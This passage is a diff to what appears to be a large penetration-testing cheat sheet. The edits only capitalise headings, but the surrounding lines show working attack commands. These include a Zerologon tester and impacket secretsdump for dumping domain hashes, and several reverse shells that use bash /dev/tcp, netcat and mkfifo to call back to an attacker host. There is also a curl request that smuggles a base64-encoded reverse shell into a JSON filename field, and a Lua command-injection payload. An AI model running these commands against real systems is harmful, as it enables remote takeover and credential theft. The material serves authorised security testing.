 - exim version <= 4.84-3
 
@@ -5716,7 +5716,7 @@ python3 zerologon_tester.py <HANDLE> <RHOST>
 impacket-secretsdump -just-dc -no-pass <HANDLE>\$@<RHOST>
 ```
 
-#### CVE-2021-3156: Sudo / sudoedit LPE
+#### CVE-2021-3156: Sudo / Sudoedit LPE
 
 > https://medium.com/mii-cybersec/privilege-escalation-cve-2021-3156-new-sudo-vulnerability-4f9e84a9f435
 
@@ -6493,7 +6493,7 @@ bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
 ```
 
-##### curl Reverse Shell
+##### Curl Reverse Shell
 
 ```c
 curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
@@ -6562,7 +6562,7 @@ http://<RHOST>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
 --';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
 ```
 
-##### mkfifo Reverse Shell
+##### Mkfifo Reverse Shell
 
 ```c
 mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
@@ -6760,7 +6760,7 @@ cewl -d 5 -m 3 -w <FILE> http://<RHOST>/index.php --with-numbers
 ./cupp -i
 ```
 
-#### crunch
+#### Crunch
 
 ```c
 crunch 6 6 -t foobar%%% > wordlist
